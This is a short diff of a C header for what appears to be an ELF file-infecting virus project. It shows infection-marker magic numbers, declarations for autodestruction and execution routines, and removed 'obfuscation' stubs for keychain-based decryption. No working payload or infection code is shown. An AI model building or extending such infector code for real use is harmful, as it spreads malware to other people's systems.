@@ -22,7 +22,8 @@
 #include <sys/random.h>
 #include <limits.h>
 
-#include "./tracer.h"
+#include "./logger.h"
+#include "../../utils/inc/utils.h"
 
 ////////////////////////////////////////////////////////////////////////////////
 /// MACROS 
@@ -30,9 +31,6 @@
 
 #define ELF_MAGIC_NUMBER 1179403647
 #define INFECTED_MAGIC_NUMBER 0x4e5750
-
-#define LEFT 0
-#define RIGHT 1
 
 #define BUFF_SIZE 0x2000
 #define PAGE_SIZE 0x1000
@@ -100,13 +98,6 @@ struct s_host
 	void *rsp;
 };
 
-struct s_keychain
-{
-	int key[2];
-
-	size_t junk[2][2];
-};
-
 ////////////////////////////////////////////////////////////////////////////////
 /// DECLARATIONS 
 ////////////////////////////////////////////////////////////////////////////////
@@ -128,12 +119,6 @@ void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_co
 void execution(const struct s_host *host, const struct s_keychain *keychain, const enum e_context context);
 
 void __exit(void);
-
-// STUB (OBFUSCATION)
-__attribute__((hot)) void update_keychain_left(struct s_keychain *keychain, const char *caller, const size_t size);
-__attribute__((hot)) void update_keychain_right(struct s_keychain *keychain, const char *caller, const size_t size);
-__attribute__((hot)) void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size);
-__attribute__((hot)) void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size);
 
 // SYSCALL
 uid_t _getuid(void);
